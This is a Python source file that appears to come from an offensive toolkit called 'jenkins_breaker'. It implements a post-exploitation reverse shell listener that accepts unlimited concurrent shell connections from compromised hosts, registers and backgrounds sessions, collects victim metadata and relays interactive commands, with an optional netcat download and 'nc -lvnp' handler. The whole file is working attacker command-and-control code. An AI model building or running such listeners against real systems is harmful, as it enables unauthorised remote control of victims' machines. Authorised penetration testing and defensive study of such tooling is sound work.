"""
Reverse shell listener and handler for post-exploitation.
"""

import os
import platform
import shutil
import socket
import subprocess
import sys
import threading
from pathlib import Path
from typing import Callable, Optional

from rich.console import Console

from jenkins_breaker.post.base import PostModule, PostResult
from jenkins_breaker.post.session_manager import session_manager

console = Console()


class ReverseShellListener:
    """
    Reverse shell listener that accepts incoming connections.

    Features:
    - Multi-handler support (netcat, socat, built-in Python listener)
    - Automatic netcat detection and download prompt
    - Interactive shell session management
    - Connection logging and monitoring
    """

    def __init__(self, lhost: str, lport: int, handler: str = "auto"):
        self.lhost = lhost
        self.lport = lport
        self.handler = handler
        self.running = False
        self.conn: Optional[socket.socket] = None
        self.listener_thread: Optional[threading.Thread] = None
        self.callback: Optional[Callable] = None

    def detect_netcat(self) -> Optional[str]:
        """
        Detect if netcat is available on the system.

        Returns:
            Path to netcat binary or None
        """
        nc_variants = ['nc', 'ncat', 'netcat']

        for variant in nc_variants:
            nc_path = shutil.which(variant)
            if nc_path:
                return nc_path

        return None

    def prompt_netcat_download(self) -> bool:
        """
        Prompt user to download netcat if not found.

        Returns:
            bool: True if user wants to download, False otherwise
        """
        console.print("\n[yellow]Netcat not found on system[/yellow]")
        console.print("\n[cyan]Netcat is recommended for stable reverse shells[/cyan]")
        console.print("\nOptions:")
        console.print("  1. Download netcat automatically (Windows only)")
        console.print("  2. Use built-in Python listener (less stable)")
        console.print("  3. Cancel")

        try:
            choice = input("\nChoice [1/2/3]: ").strip()

            if choice == "1":
                if platform.system() == "Windows":
                    return self._download_netcat_windows()
                else:
                    console.print("[red]Automatic download only supported on Windows[/red]")
                    console.print("[yellow]Please install netcat manually:[/yellow]")
                    console.print("  - Ubuntu/Debian: sudo apt install netcat-openbsd")
                    console.print("  - CentOS/RHEL: sudo yum install nmap-ncat")
                    console.print("  - macOS: brew install netcat")
                    return False
            elif choice == "2":
                return True
            else:
                return False

        except (KeyboardInterrupt, EOFError):
            return False

    def _download_netcat_windows(self) -> bool:
        """
        Download netcat for Windows.

        Returns:
            bool: True if successful
        """
        try:
            import urllib.request
            import zipfile

            console.print("[cyan]Downloading netcat for Windows...[/cyan]")

            nc_url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
            download_dir = Path.home() / ".jenkins_breaker" / "tools"
            download_dir.mkdir(parents=True, exist_ok=True)

            zip_path = download_dir / "netcat.zip"

            urllib.request.urlretrieve(nc_url, zip_path)

            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(download_dir)

            zip_path.unlink()

            nc_exe = download_dir / "nc.exe"
            if nc_exe.exists():
                console.print(f"[green]Netcat downloaded to: {nc_exe}[/green]")
                os.environ["PATH"] = str(download_dir) + os.pathsep + os.environ["PATH"]
                return True
            else:
                console.print("[red]Failed to extract netcat[/red]")
                return False

        except Exception as e:
            console.print(f"[red]Download failed: {e}[/red]")
            return False

    def start_netcat_listener(self) -> bool:
        """
        Start listener using netcat.

        Returns:
            bool: True if started successfully
        """
        nc_path = self.detect_netcat()

        if not nc_path:
            if not self.prompt_netcat_download():
                console.print("[yellow]Falling back to built-in Python listener[/yellow]")
                return self.start_python_listener()

            nc_path = self.detect_netcat()
            if not nc_path:
                return self.start_python_listener()

        try:
            console.print(f"[cyan]Starting netcat listener on {self.lhost}:{self.lport}[/cyan]")

            cmd = [nc_path, '-lvnp', str(self.lport)]

            if platform.system() != "Windows":
                cmd = [nc_path, '-lvnp', str(self.lport)]

            subprocess.run(cmd)

            return True

        except Exception as e:
            console.print(f"[red]Netcat listener failed: {e}[/red]")
            return False

    def start_python_listener(self) -> bool:
        """
        Start listener using built-in Python socket - MULTI-HANDLER MODE.
        Accepts unlimited concurrent connections, each in separate thread.

        Returns:
            bool: True if started successfully
        """
        try:
            # Log to file since TUI redirects stdout
            import sys
            debug_log = open("C:/Users/Chogyam/listener_debug.log", "a")
            debug_log.write(f"[DEBUG-LISTENER] Starting on {self.lhost}:{self.lport}\n")
            debug_log.flush()

            console.print(f"[cyan]Starting MULTI-HANDLER listener on {self.lhost}:{self.lport}[/cyan]")
            print(f"[DEBUG-LISTENER] Starting on {self.lhost}:{self.lport}", flush=True, file=sys.__stdout__)

            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

            if hasattr(socket, 'TCP_KEEPIDLE'):
                server.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
            if hasattr(socket, 'TCP_KEEPINTVL'):
                server.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
            if hasattr(socket, 'TCP_KEEPCNT'):
                server.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)

            server.bind((self.lhost, self.lport))
            server.listen(20)

            console.print(f"[bold green]Multi-handler listening on {self.lhost}:{self.lport}[/bold green]")
            console.print("[cyan]Ready to accept unlimited concurrent sessions...[/cyan]")
            debug_log.write("[DEBUG-LISTENER] Listening, entering accept loop\n")
            debug_log.flush()

            self.running = True
            connection_count = 0

            while self.running:
                try:
                    server.settimeout(1.0)
                    try:
                        conn, addr = server.accept()
                        debug_log.write(f"[DEBUG-LISTENER] accept() returned connection from {addr}\n")
                        debug_log.flush()
                    except socket.timeout:
                        continue

                    connection_count += 1
                    debug_log.write(f"[DEBUG] Accepted connection from {addr}, setting to blocking mode...\n")
                    debug_log.flush()

                    # CRITICAL: Set to blocking mode IMMEDIATELY (like ncat)
                    # Must be done BEFORE any other operations or session registration
                    conn.setblocking(True)
                    conn.settimeout(None)
                    debug_log.write("[DEBUG] Socket configured: blocking=True, timeout=None\n")
                    debug_log.flush()

                    conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                    if hasattr(socket, 'TCP_KEEPIDLE'):
                        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
                    if hasattr(socket, 'TCP_KEEPINTVL'):
                        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
                    if hasattr(socket, 'TCP_KEEPCNT'):
                        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)

                    console.print(f"[bold green]>>> Connection #{connection_count} from {addr[0]}:{addr[1]}[/bold green]")
                    debug_log.write("[DEBUG] Registering session with BLOCKING socket...\n")
                    debug_log.flush()

                    local_addr = server.getsockname()
                    session_id = session_manager.register_session(
                        conn,
                        remote_addr=addr,
                        local_addr=local_addr
                    )
                    console.print(f"[cyan]>>> Session registered: {session_id}[/cyan]")
                    debug_log.write(f"[DEBUG] Session {session_id} registered with pre-configured socket\n")
                    debug_log.flush()

                    metadata_thread = threading.Thread(
                        target=session_manager.collect_metadata,
                        args=(session_id,),
                        daemon=True
                    )
                    metadata_thread.start()

                    if self.callback:
                        callback_thread = threading.Thread(
                            target=self.callback,
                            args=(conn, addr, session_id),
                            daemon=True
                        )
                        callback_thread.start()

                    console.print(f"[dim]Active sessions: {len(session_manager.list_active_sessions())}[/dim]")

                except KeyboardInterrupt:
                    console.print("\n[yellow]Stopping listener...[/yellow]")
                    print("[DEBUG] Keyboard interrupt, stopping listener", flush=True)
                    break
                except Exception as e:
                    console.print(f"[red]Connection handler error: {e}[/red]")
                    print(f"[DEBUG] Exception in connection handler: {e}", flush=True)
                    import traceback
                    traceback.print_exc()
                    continue

            server.close()
            console.print(f"[yellow]Listener stopped. Total connections handled: {connection_count}[/yellow]")
            return True

        except Exception as e:
            console.print(f"[red]Python listener failed: {e}[/red]")
            return False
        finally:
            self.running = False

    def _interactive_shell(self, conn: socket.socket, session_id: str = None):
        """
        Handle interactive shell session.

        Args:
            conn: Socket connection
            session_id: Session ID from session manager
        """
        console.print("\n[green]Interactive shell established[/green]")
        console.print("[cyan]Type commands and press Enter[/cyan]")
        console.print("[yellow]Type 'exit' or Ctrl+D to background session[/yellow]\n")

        if session_id:
            console.print(f"[bold]Session ID:[/bold] {session_id}\n")

        conn.send(b"id\n")

        def receive_output():
            while self.running:
                try:
                    data = conn.recv(4096)
                    if not data:
                        if session_id:
                            session_manager.mark_session_dead(session_id)
                        break
                    sys.stdout.write(data.decode('utf-8', errors='ignore'))
                    sys.stdout.flush()
                    if session_id:
                        session_manager.heartbeat(session_id)
                except Exception:
                    if session_id:
                        session_manager.mark_session_dead(session_id)
                    break

        receiver = threading.Thread(target=receive_output, daemon=True)
        receiver.start()

        try:
            while self.running:
                try:
                    command = input()
                    if command.lower() == 'exit':
                        break

                    conn.send((command + '\n').encode())

                except (KeyboardInterrupt, EOFError):
                    if session_id:
                        console.print("\n[cyan]Backgrounding session...[/cyan]")
                        session_manager.background_current_session()
                    break

        finally:
            self.running = False
            if session_id and command and command.lower() == 'exit':
                console.print("\n[yellow]Closing connection[/yellow]")
                session_manager.mark_session_dead(session_id)
            else:
                console.print("\n[yellow]Session backgrounded[/yellow]")

    def start(self, callback: Optional[Callable] = None) -> bool:
        """
        Start the reverse shell listener.

        Args:
            callback: Optional callback function for handling connections

        Returns:
            bool: True if started successfully
        """
        self.callback = callback

        if self.handler == "auto":
            return self.start_python_listener()

        elif self.handler == "netcat":
            return self.start_netcat_listener()

        elif self.handler == "python":
            return self.start_python_listener()

        else:
            console.print(f"[red]Unknown handler: {self.handler}[/red]")
            return False

    def stop(self):
        """Stop the listener."""
        self.running = False
        if self.conn:
            try:
                self.conn.close()
            except Exception:
                pass


class ReverseShellModule(PostModule):
    """Post-exploitation module for reverse shell handling."""

    MODULE_NAME = "reverse_shell"
    MODULE_DESCRIPTION = "Reverse shell listener and handler"

    def run(self, session, **kwargs) -> PostResult:
        """
        Start a reverse shell listener.

        Args:
            session: Not used for listeners
            **kwargs: lhost, lport, handler

        Returns:
            PostResult: Result of listener execution
        """
        lhost = kwargs.get('lhost', '0.0.0.0')
        lport = kwargs.get('lport', 4444)
        handler = kwargs.get('handler', 'auto')

        listener = ReverseShellListener(lhost, lport, handler)

        try:
            success = listener.start()

            if success:
                return PostResult(
                    module=self.MODULE_NAME,
                    status="success",
                    details=f"Reverse shell session established on {lhost}:{lport}",
                    data={
                        "lhost": lhost,
                        "lport": lport,
                        "handler": handler
                    }
                )
            else:
                return PostResult(
                    module=self.MODULE_NAME,
                    status="failure",
                    details="Failed to establish reverse shell connection",
                    error="Listener failed to start"
                )

        except Exception as e:
            return PostResult(
                module=self.MODULE_NAME,
                status="error",
                details="Reverse shell listener encountered an error",
                error=str(e)
            )


def spawn_reverse_shell(lhost: str, lport: int, handler: str = "auto") -> bool:
    """
    Convenience function to spawn a reverse shell listener.

    Args:
        lhost: Host to listen on
        lport: Port to listen on
        handler: Handler type (auto, netcat, python)

    Returns:
        bool: True if successful
    """
    listener = ReverseShellListener(lhost, lport, handler)
    return listener.start()
